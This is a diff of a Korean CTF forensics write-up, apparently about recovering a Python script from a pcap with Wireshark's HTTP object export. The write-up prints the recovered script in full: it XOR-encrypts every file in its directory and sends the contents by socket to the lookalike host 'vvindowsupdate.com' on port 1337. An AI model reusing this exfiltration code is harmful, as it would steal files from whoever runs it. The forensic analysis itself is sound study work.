@@ -68,9 +68,66 @@ https://www.remorecover.com/blog/ko/ko-fix-make-sure-the-file-is-in-an-ntfs-volu
 
 ![image](https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/2f585e61-7ee3-4d3d-a39f-61537d0047a8)
 
-wireshark를 사용해 주어진 pcap 파일 실행 해보면, Object를 통해 python 파일 하나가 존재하는걸 확인할 수 있었다. 
+wireshark를 사용해 주어진 pcap 파일 실행 해보면,
+[File] - [Export Objects] - [HTTP] 기능을 통해 python 파일 하나가 존재하는걸 확인할 수 있었다. 
 ![image](https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/670cb06b-e176-4f07-96f5-b048bb958286)
 ![image](https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/d5dfb54d-df96-4b38-9688-bc348907b747)
+
+추출해 확인된 코드를 살펴보면. 
+```
+# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
+key = randbytes(32)
+
+def encrypt(filename):
+    f = open(filename, 'rb')
+    data = f.read()
+    f.close()
+   
+    encrypted = xor(data, key)
+    return encrypted
+
+def send_encrypted(filename):
+    print(f'sending {filename}')
+    data = encrypt(filename)
+    
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('vvindowsupdate.com', 1337))
+    s.sendall((f'Sending: {filename}').encode())
+    s.close()
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(('vvindowsupdate.com', 1337))
+    s.sendall(data)
+    s.close()
+
+def get_all_files():
+    file_paths = []
+    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
+        for file in files:
+            file_paths.append(os.path.join(root, file))
+    file_paths.remove(__file__)      
+    return file_paths
+
+files = get_all_files()
+for f in files:
+    send_encrypted(f)
+    #os.remove(f)
+```
+
+이 스크립트는 현재 디렉토리와 하위 디렉토리 내 모든 파일을 암호화한 후, 암호화된 데이터를 지정된 서버로 전송하는 코드이다. 이 스크립트를 실행하기 전, 랜덤 키를 실제 키로 변경해야 한다?...
+
+일단 더 패킷을 살펴 봐야 할 것 같다. [Statics] - [Conversations] 기능을 통해 해당 파일의 연결 정보와 내용을 확인해 하나씩 확인해보면,
+
+![image](https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/2ec77081-4f28-4595-a6d8-96812ea5991d)
+
+<img width="511" alt="image" src="https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/b41321bd-4290-402c-9bc0-728c59745b60">
+<img width="448" alt="image" src="https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/ac1467e4-8759-434f-adf5-faf3d8246fe4">
+<img width="400" alt="image" src="https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/90b695b2-9b51-4e42-a930-8097bc6e2f02">
+<img width="431" alt="image" src="https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/deda1bb3-7236-4f22-86c5-19b5ee979424">
+<img width="432" alt="image" src="https://github.com/VKUOCA/CTF-Write-Up/assets/128664025/7bca7a49-5f7a-45ca-951f-b42d0e9567d9">
+
+
+
 
 
 
